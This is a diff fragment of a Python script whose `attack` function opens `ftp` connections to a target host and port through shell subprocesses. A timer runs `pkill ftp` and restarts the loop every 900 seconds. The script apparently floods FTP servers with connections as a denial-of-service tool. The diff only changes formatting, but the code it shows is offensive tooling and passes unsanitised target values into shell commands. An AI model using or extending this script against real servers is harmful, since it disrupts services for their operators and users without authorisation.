@@ -51,8 +51,7 @@ def attack(targ, po, id):
 	try:
 		subprocess.Popen("ftp {0} {1}".format(targ, po), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		#print("Worker {} running".format(id))
-	except OSError: 
-		pass
+	except OSError: pass
 def main():
 	global target, port, start
 	print(banner)
@@ -92,13 +91,11 @@ def main():
 def timer():
         start = time.time()
         while 1:
-                if start < time.time() + float(900): 
-                	pass
+                if start < time.time() + float(900): pass
                 else:
-	                subprocess.Popen("pkill ftp", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-	                t = threading.Thread(target=loop, args=(target, port,))
-	                t.start()
-	                break
+                        subprocess.Popen("pkill ftp", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                        t = threading.Thread(target=loop, args=(target, port,))
+                        t.start()
+                        break
 
 main()
-            
